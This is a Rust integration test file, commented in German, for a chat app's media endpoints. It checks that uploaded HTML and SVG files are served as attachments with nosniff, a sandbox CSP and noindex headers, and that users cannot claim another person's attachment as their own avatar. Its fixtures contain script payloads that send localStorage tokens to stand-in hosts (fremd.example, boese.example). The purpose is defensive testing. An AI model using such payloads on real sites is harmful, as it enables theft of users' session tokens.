//! Wie Medien ausgeliefert werden – und warum das seit dem Umzug zählt.
//!
//! Solange die App auf Vercel lag und die Dateien in Cloudflare R2, waren das
//! zwei verschiedene Herkünfte. Eine hochgeladene HTML-Datei konnte im Browser
//! anrichten, was sie wollte – an die Anmeldung der App kam sie nicht heran.
//!
//! Auf einem eigenen Server liegt beides unter derselben Domain. Damit ist eine
//! hochgeladene `.html` ein Dokument **im Ursprung der App**: Es liest den
//! Token aus dem Browserspeicher und schickt ihn weg. Die Medienadresse ist
//! damals ohne Anmeldung abrufbar, damit `<img>` und der Service Worker
//! funktionieren – es genügt also, jemandem den Link zu schicken.
//!
//! Der Umzug hat diese Lücke aufgemacht, nicht ein Fehler im alten Code. Diese
//! Tests halten sie zu.
//!
//! Seit dem Medien-Keks verlangen die Routen zusätzlich eine angemeldete
//! Person (siehe `medien_rechte.rs`). Hier geht es weiter um die KOPFZEILEN,
//! nicht um die Anmeldung – deshalb fragt jeder Abruf mit dem Token dessen,
//! der die Datei hochgeladen hat.

use axum::body::Body;
use axum::http::{Request, StatusCode};
use axum::Router;
use http_body_util::BodyExt;
use serde_json::{json, Value};
use tower::ServiceExt;
use uuid::Uuid;

use initiative_api::config::Config;
use initiative_api::state::AppState;
use initiative_api::{app, MIGRATOR};

struct Probe {
    router: Router,
}

impl Probe {
    async fn call(
        &self,
        method: &str,
        uri: &str,
        token: Option<&str>,
        body: Option<Value>,
    ) -> (StatusCode, Value) {
        let mut builder = Request::builder().method(method).uri(uri);
        if let Some(token) = token {
            builder = builder.header("authorization", format!("Bearer {token}"));
        }
        let request = match body {
            Some(body) => builder
                .header("content-type", "application/json")
                .body(Body::from(serde_json::to_vec(&body).unwrap()))
                .unwrap(),
            None => builder.body(Body::empty()).unwrap(),
        };
        let response = self.router.clone().oneshot(request).await.unwrap();
        let status = response.status();
        let bytes = response.into_body().collect().await.unwrap().to_bytes();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }

    async fn roh(
        &self,
        method: &str,
        uri: &str,
        token: Option<&str>,
        kopfzeilen: Vec<(&str, String)>,
        body: Body,
    ) -> (StatusCode, Vec<(String, String)>, Vec<u8>) {
        let mut builder = Request::builder().method(method).uri(uri);
        if let Some(token) = token {
            builder = builder.header("authorization", format!("Bearer {token}"));
        }
        for (name, wert) in kopfzeilen {
            builder = builder.header(name, wert);
        }
        let response = self
            .router
            .clone()
            .oneshot(builder.body(body).unwrap())
            .await
            .unwrap();
        let status = response.status();
        let kopf = response
            .headers()
            .iter()
            .map(|(name, wert)| {
                (
                    name.as_str().to_string(),
                    wert.to_str().unwrap_or_default().to_string(),
                )
            })
            .collect();
        let bytes = response.into_body().collect().await.unwrap().to_bytes();
        (status, kopf, bytes.to_vec())
    }

    /// Lädt eine Datei hoch und gibt ihre Kennung zurück.
    async fn hochladen(
        &self,
        token: &str,
        art: &str,
        typ: &str,
        dateiname: &str,
        inhalt: &[u8],
    ) -> String {
        let (status, upload) = self
            .call(
                "POST",
                "/api/v1/media/uploads",
                Some(token),
                Some(json!({
                    "kind": art,
                    "mime": typ,
                    "size": inhalt.len(),
                    "fileName": dateiname,
                })),
            )
            .await;
        assert_eq!(status, StatusCode::CREATED, "{upload}");
        let kennung = upload["attachmentId"]
            .as_str()
            .expect("Kennung")
            .to_string();

        let grenze = "----initiativemedien";
        let mut body = Vec::new();
        body.extend_from_slice(format!("--{grenze}\r\n").as_bytes());
        body.extend_from_slice(
            format!("Content-Disposition: form-data; name=\"file\"; filename=\"{dateiname}\"\r\n")
                .as_bytes(),
        );
        body.extend_from_slice(format!("Content-Type: {typ}\r\n\r\n").as_bytes());
        body.extend_from_slice(inhalt);
        body.extend_from_slice(format!("\r\n--{grenze}--\r\n").as_bytes());

        let (status, _, _) = self
            .roh(
                "POST",
                &format!("/api/v1/media/uploads/{kennung}/data"),
                Some(token),
                vec![(
                    "content-type",
                    format!("multipart/form-data; boundary={grenze}"),
                )],
                Body::from(body),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "Upload von {dateiname}");
        kennung
    }
}

async fn aufbauen() -> Option<(Probe, String)> {
    let url = std::env::var("TEST_DATABASE_URL")
        .or_else(|_| std::env::var("DATABASE_URL"))
        .ok()?;
    std::env::set_var("DATABASE_URL", &url);
    std::env::set_var("NODE_ENV", "test");
    std::env::set_var("JWT_SECRET", "test-secret-value-at-least-16-characters");
    std::env::set_var("REALTIME_BUS", "memory");
    std::env::set_var("STORAGE_DRIVER", "local");
    std::env::set_var(
        "LOCAL_STORAGE_DIR",
        format!("./.data/medien-{}", Uuid::now_v7().simple()),
    );
    std::env::set_var("PUBLIC_API_URL", "http://localhost:8080");
    std::env::set_var("PUBLIC_APP_URL", "http://localhost:5173");
    std::env::remove_var("MEDIA_KEY");

    let state = AppState::new(Config::from_env().expect("config"))
        .await
        .expect("state");
    MIGRATOR.run(&state.pool).await.expect("migrations");
    let probe = Probe {
        router: app::build(state),
    };

    let kennung = Uuid::now_v7().simple().to_string();
    let name = format!("medien{}", &kennung[kennung.len() - 12..]);
    let (status, konto) = probe
        .call(
            "POST",
            "/api/v1/auth/register",
            None,
            Some(json!({
                "username": &name,
                "displayName": "Medien Test",
                "password": "richtigespasswort",
            })),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{konto}");
    let token = konto["accessToken"].as_str().expect("Token").to_string();
    Some((probe, token))
}

fn kopfzeile(kopf: &[(String, String)], name: &str) -> String {
    kopf.iter()
        .find(|(schluessel, _)| schluessel == name)
        .map(|(_, wert)| wert.clone())
        .unwrap_or_default()
}

#[tokio::test(flavor = "multi_thread")]
async fn gefaehrliche_dateien_werden_nicht_angezeigt_harmlose_schon() {
    let Some((probe, token)) = aufbauen().await else {
        eprintln!("TEST_DATABASE_URL fehlt – übersprungen");
        return;
    };

    // --- Der Angriff ------------------------------------------------------
    // Genau das, was jemand hochladen würde: eine Seite, die den Token
    // ausliest und wegschickt. Sie wird über `kind: "file"` angenommen, dort
    // ist jeder Typ erlaubt – das ist Absicht und soll so bleiben.
    let boese = br#"<script>fetch('https://fremd.example/'+localStorage.token)</script>"#;
    let kennung = probe
        .hochladen(&token, "file", "text/html", "rechnung.html", boese)
        .await;

    let (status, kopf, _) = probe
        .roh(
            "GET",
            &format!("/api/v1/media/{kennung}"),
            Some(&token),
            vec![],
            Body::empty(),
        )
        .await;
    assert_eq!(status, StatusCode::OK);

    let disposition = kopfzeile(&kopf, "content-disposition");
    assert!(
        disposition.starts_with("attachment"),
        "HTML muss zum Herunterladen angeboten werden, nicht dargestellt – hier stand: {disposition:?}"
    );
    assert_eq!(
        kopfzeile(&kopf, "x-content-type-options"),
        "nosniff",
        "ohne nosniff rät der Browser den Typ selbst"
    );
    let csp = kopfzeile(&kopf, "content-security-policy");
    assert!(
        csp.contains("sandbox"),
        "die zweite Verteidigungslinie fehlt: {csp:?}"
    );

    /*
     * Nicht in einen Suchindex.
     *
     * Eine Anhangsadresse traegt ihre Berechtigung in sich: Wer sie kennt,
     * bekommt die Datei. Das ist gewollt und ohne Umbau nicht zu aendern -
     * Bilder kommen ueber `<img src>`, und dort kann kein Token mitfahren.
     * Wogegen diese Kopfzeile hilft, ist der zweite Schritt: dass eine
     * versehentlich oeffentlich gewordene Adresse auch noch AUFFINDBAR wird.
     */
    let robots = kopfzeile(&kopf, "x-robots-tag");
    assert!(
        robots.contains("noindex") && robots.contains("noimageindex"),
        "Anhaenge duerfen nicht in einem Suchindex landen - hier stand: {robots:?}"
    );

    /*
     * Und nicht in einem fremden Zwischenspeicher: `private` verbietet jedem
     * Vermittler auf dem Weg, die Antwort fuer andere aufzubewahren.
     */
    let cache = kopfzeile(&kopf, "cache-control");
    assert!(
        cache.contains("private"),
        "die Antwort darf nur im Geraet des Empfaengers liegen - hier stand: {cache:?}"
    );

    // --- Dasselbe als SVG -------------------------------------------------
    // Ein Bild und gleichzeitig ein Dokument, in dem Skript läuft. Wer
    // `image/*` erlaubt hätte, wäre hier hereingefallen.
    let svg = br#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;
    let kennung = probe
        .hochladen(&token, "file", "image/svg+xml", "logo.svg", svg)
        .await;
    let (_, kopf, _) = probe
        .roh(
            "GET",
            &format!("/api/v1/media/{kennung}"),
            Some(&token),
            vec![],
            Body::empty(),
        )
        .await;
    assert!(
        kopfzeile(&kopf, "content-disposition").starts_with("attachment"),
        "SVG darf nicht dargestellt werden"
    );

    // --- Und das Übliche muss weiter funktionieren ------------------------
    // Ein Schutz, der nebenbei alle Fotos zum Download macht, wäre keiner,
    // sondern ein kaputter Chat.
    let png = png_pixel();
    let kennung = probe
        .hochladen(&token, "image", "image/png", "urlaub.png", &png)
        .await;
    let (status, kopf, bytes) = probe
        .roh(
            "GET",
            &format!("/api/v1/media/{kennung}"),
            Some(&token),
            vec![],
            Body::empty(),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        kopfzeile(&kopf, "content-disposition"),
        "",
        "ein Foto im Chat muss angezeigt werden"
    );
    assert_eq!(kopfzeile(&kopf, "content-type"), "image/png");
    assert_eq!(bytes, png);

    // --- Herunterladen bleibt möglich, wenn man es will -------------------
    let (status, kopf, _) = probe
        .roh(
            "GET",
            &format!("/api/v1/media/{kennung}/download"),
            Some(&token),
            vec![],
            Body::empty(),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        kopfzeile(&kopf, "content-disposition").starts_with("attachment"),
        "der Herunterladen-Weg muss weiter anhängen"
    );
}

/// Was nicht angezeigt werden darf, wird auch nicht umgeleitet.
///
/// Der Schutz gegen eine hochgeladene `.html` entsteht erst beim Zusammenbauen
/// der Antwort: Positivliste, `nosniff`, `sandbox`-CSP, Anhang-Kopfzeile. Auf
/// dem Umleitungsweg (R2/S3 ohne `MEDIA_KEY`) gab es davon nichts – dort
/// entschied der Eimer über Typ und Darstellung, und die signierte Adresse
/// trägt `text/html` aus der Datenbank.
///
/// Der Test prüft die Regel dort, wo sie beobachtbar ist: Beim lokalen
/// Speicher wird ohnehin nie umgeleitet, also muss jede Antwort – ob harmlos
/// oder nicht – aus der API kommen und die Kopfzeilen tragen. Die Bedingung
/// selbst steht in `serve` und gilt für jede Speicherart.
#[tokio::test(flavor = "multi_thread")]
async fn eine_html_datei_kommt_immer_durch_die_api() {
    let Some((probe, token)) = aufbauen().await else {
        eprintln!("TEST_DATABASE_URL nicht gesetzt – übersprungen");
        return;
    };

    let kennung = probe
        .hochladen(
            &token,
            "file",
            "text/html",
            "seite.html",
            b"<script>fetch('//boese.example/'+localStorage.getItem('initiative.tokens'))</script>",
        )
        .await;

    let (status, kopf, _) = probe
        .roh(
            "GET",
            &format!("/api/v1/media/{kennung}"),
            Some(&token),
            vec![],
            Body::empty(),
        )
        .await;

    // Keine Umleitung, sondern die Antwort der API selbst.
    assert_eq!(status, StatusCode::OK, "keine Umleitung fuer text/html");
    assert!(
        kopfzeile(&kopf, "content-disposition").starts_with("attachment"),
        "eine .html wird heruntergeladen, nicht dargestellt"
    );
    assert!(
        kopfzeile(&kopf, "content-security-policy").contains("sandbox"),
        "und selbst dann liegt sie in einem leeren Ursprung ohne Skript"
    );
    assert_eq!(kopfzeile(&kopf, "x-content-type-options"), "nosniff");

    // Ein Bild darf dagegen dargestellt werden – sonst prueft der Test nur,
    // dass gar nichts geht.
    let bild = probe
        .hochladen(&token, "image", "image/png", "harmlos.png", &png_pixel())
        .await;
    let (status, kopf, _) = probe
        .roh(
            "GET",
            &format!("/api/v1/media/{bild}"),
            Some(&token),
            vec![],
            Body::empty(),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        kopfzeile(&kopf, "content-disposition").is_empty(),
        "ein PNG wird angezeigt, nicht angehaengt"
    );
}

/// Eine fremde Anhangskennung wird nicht zum eigenen Bild.
///
/// Die Kennung ist in dieser API der Schlüssel zur Datei – wer sie kennt, darf
/// lesen. Sie darf deshalb nicht zugleich ein Mittel sein, Rechte zu VERGEBEN:
/// Liesse sich eine fremde Kennung als eigenes Profilbild oder als Bild einer
/// Gruppe eintragen, würde daraus „jeder in dieser Gruppe sieht die Datei" –
/// die Weitergabe eines fremden Bildes an einen ganzen Kreis, mit einem PATCH
/// und einer geratenen Kennung.
#[tokio::test(flavor = "multi_thread")]
async fn eine_fremde_datei_wird_nicht_zum_eigenen_bild() {
    let Some((probe, token)) = aufbauen().await else {
        eprintln!("TEST_DATABASE_URL nicht gesetzt – übersprungen");
        return;
    };

    // Der erste lädt ein Bild hoch. Er allein hat es hochgeladen.
    let fremd = probe
        .hochladen(&token, "image", "image/png", "geheim.png", &png_pixel())
        .await;

    // Ein zweites Konto, das die Kennung nur kennt.
    let kennung = Uuid::now_v7().simple().to_string();
    let name = format!("dieb{}", &kennung[kennung.len() - 12..]);
    let (status, konto) = probe
        .call(
            "POST",
            "/api/v1/auth/register",
            None,
            Some(json!({
                "username": &name,
                "displayName": "Zweites Konto",
                "password": "richtigespasswort",
            })),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{konto}");
    let dieb = konto["accessToken"].as_str().expect("Token").to_string();

    // Eine Gruppe braucht mindestens ein Mitglied – ein drittes Konto dafür.
    let name = format!("gast{}", &kennung[kennung.len() - 12..]);
    let (status, gast) = probe
        .call(
            "POST",
            "/api/v1/auth/register",
            None,
            Some(json!({
                "username": &name,
                "displayName": "Drittes Konto",
                "password": "richtigespasswort",
            })),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{gast}");
    let gast_id = gast["user"]["id"].as_str().expect("Kennung").to_string();

    // Als Profilbild: abgelehnt.
    let (status, antwort) = probe
        .call(
            "PATCH",
            "/api/v1/users/me",
            Some(&dieb),
            Some(json!({ "avatarAttachmentId": fremd })),
        )
        .await;
    assert_eq!(
        status,
        StatusCode::NOT_FOUND,
        "eine fremde Datei darf nicht das eigene Profilbild werden: {antwort}"
    );

    // Als Gruppenbild beim Anlegen: ebenfalls abgelehnt.
    let (status, antwort) = probe
        .call(
            "POST",
            "/api/v1/conversations",
            Some(&dieb),
            Some(json!({
                "type": "group",
                "title": "Runde",
                "memberIds": [gast_id],
                "avatarAttachmentId": fremd,
            })),
        )
        .await;
    assert_eq!(
        status,
        StatusCode::NOT_FOUND,
        "eine fremde Datei darf nicht das Bild einer Gruppe werden: {antwort}"
    );

    // Und der Weg über das Ändern eines bestehenden Chats ist derselbe.
    let (status, chat) = probe
        .call(
            "POST",
            "/api/v1/conversations",
            Some(&dieb),
            Some(json!({ "type": "group", "title": "Runde", "memberIds": [gast_id] })),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{chat}");
    let chat_id = chat["id"].as_str().expect("Chatkennung");
    let (status, antwort) = probe
        .call(
            "PATCH",
            &format!("/api/v1/conversations/{chat_id}"),
            Some(&dieb),
            Some(json!({ "avatarAttachmentId": fremd })),
        )
        .await;
    assert_eq!(
        status,
        StatusCode::NOT_FOUND,
        "auch nachträglich nicht: {antwort}"
    );

    // Das eigene Bild geht selbstverständlich weiter.
    let eigenes = probe
        .hochladen(&dieb, "image", "image/png", "meins.png", &png_pixel())
        .await;
    let (status, antwort) = probe
        .call(
            "PATCH",
            "/api/v1/users/me",
            Some(&dieb),
            Some(json!({ "avatarAttachmentId": eigenes })),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "das eigene Bild muss gehen: {antwort}");
}

/// Das kleinstmögliche gültige PNG – ein Pixel.
fn png_pixel() -> Vec<u8> {
    const ROH: &[u8] = &[
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44,
        0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F,
        0x15, 0xC4, 0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9C, 0x63, 0x00,
        0x01, 0x00, 0x00, 0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x49,
        0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
    ];
    ROH.to_vec()
}
